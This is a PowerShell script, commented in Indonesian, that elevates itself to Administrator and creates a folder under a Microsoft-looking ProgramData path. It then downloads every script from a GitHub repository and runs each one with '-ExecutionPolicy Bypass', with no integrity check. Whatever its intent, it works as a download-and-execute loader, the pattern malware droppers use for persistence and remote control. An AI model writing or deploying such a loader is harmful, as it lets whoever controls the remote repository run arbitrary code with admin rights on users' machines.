# [1] Jalankan sebagai Admin
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# [2] Persiapan folder dan log - DIUBAH
$targetFolder = "$env:ProgramData\Microsoft\Windows\Automation"
$logPath = "$targetFolder\check-log.txt"

if (-not (Test-Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder | Out-Null
    Add-Content -Path $logPath -Value "$(Get-Date) - Folder 'Automation' dibuat"
} else {
    Add-Content -Path $logPath -Value "$(Get-Date) - Folder 'Automation' sudah ada"
}

# [3] Cek GitHub
$repoUser = "aziaditiya"
$repoName = "automation"
$branch = "main"
$apiUrl = "https://api.github.com/repos/$repoUser/$repoName/contents/"
$existingFiles = Get-ChildItem $targetFolder | Select-Object -ExpandProperty Name

try {
    $response = Invoke-RestMethod -Uri $apiUrl
    Add-Content -Path $logPath -Value "$(Get-Date) - Berhasil akses repo GitHub"
} catch {
    Add-Content -Path $logPath -Value "$(Get-Date) - Gagal akses GitHub: $($_.Exception.Message)"
    exit
}

foreach ($file in $response) {
    $remoteName = $file.name
    $fileUrl = $file.download_url

    # Cek nama mirip
    $similar = $existingFiles | Where-Object { $_ -like "$($remoteName.Split('.')[0])*" }
    if ($similar) {
        Add-Content -Path $logPath -Value "$(Get-Date) - Lewati file mirip: $remoteName"
        continue
    }

    # Download dan eksekusi
    $localPath = Join-Path $targetFolder $remoteName
    try {
        Invoke-WebRequest -Uri $fileUrl -OutFile $localPath -UseBasicParsing
        Add-Content -Path $logPath -Value "$(Get-Date) - Berhasil download: $remoteName"
        Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$localPath`""
    }
    catch {
        $errorMsg = "$(Get-Date) - Gagal download/jalankan $remoteName - $($_.Exception.Message)"
        Add-Content -Path $logPath -Value $errorMsg
        notepad.exe $logPath
    }
}
